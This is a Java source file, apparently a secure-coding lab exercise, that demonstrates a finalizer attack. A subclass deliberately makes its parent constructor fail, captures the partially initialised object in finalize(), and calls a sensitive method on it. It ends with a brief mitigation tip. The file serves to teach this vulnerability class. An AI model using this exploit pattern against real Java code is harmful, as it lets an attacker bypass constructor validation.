/**
 * FinalizerAttackExploit.java
 * 
 * This class demonstrates how a finalizer attack can capture a reference
 * to a partially initialized object whose constructor failed.
 */
public class FinalizerAttackExploit extends VulnerableSensitiveClass {
    static VulnerableSensitiveClass stolenReference;

    public FinalizerAttackExploit() {
        // We call the super constructor with invalid data to trigger an exception.
        super("");
    }

    /**
     * This method is called by the JVM's garbage collector before the object
     * is reclaimed. Even if the constructor failed, finalize() will be called.
     */
    @Override
    protected void finalize() {
        // The exploit: Save a reference to 'this' before it's garbage collected.
        stolenReference = this;
        System.out.println("[!] EXPLOIT: Finalizer called! Stolen a reference to the partially initialized object.");
    }

    public static void main(String[] args) {
        System.out.println("=== Lab 7-3: Object Construction - Partial Initialization ===\n");

        System.out.println("[Step 1] Attempting to create an exploit instance (which will fail)...");
        try {
            new FinalizerAttackExploit();
        } catch (Exception e) {
            System.out.println("Caught expected exception from constructor: " + e.getMessage());
        }

        // [Step 2] Triggering Garbage Collection to run the finalizer.
        // This is non-deterministic in standard Java, but usually works in a lab
        // environment with these calls.
        System.out.println("[Step 2] Triggering Garbage Collection to run finalizers...");
        System.gc();
        System.runFinalization();

        // Give the GC and finalizer thread a moment to work
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
        }

        // [Step 3] Accessing the stolen object
        System.out.println("[Step 3] Checking if reference was stolen...");
        if (stolenReference != null) {
            System.out.println("EXPLOIT SUCCESS! Invoking method on partially initialized object:");
            stolenReference.doSomethingSensitive();
        } else {
            System.out.println("EXPLOIT FAILED: The finalizer was not called or didn't run in time.");
            System.out.println("(Note: finalize() behavior is dependent on the JVM and GC timing)");
        }

        System.out.println("\n--------------------------------------------------\n");
        System.out.println("NOTE: To prevent this, make your sensitive classes 'final' or use security flags.");
    }
}
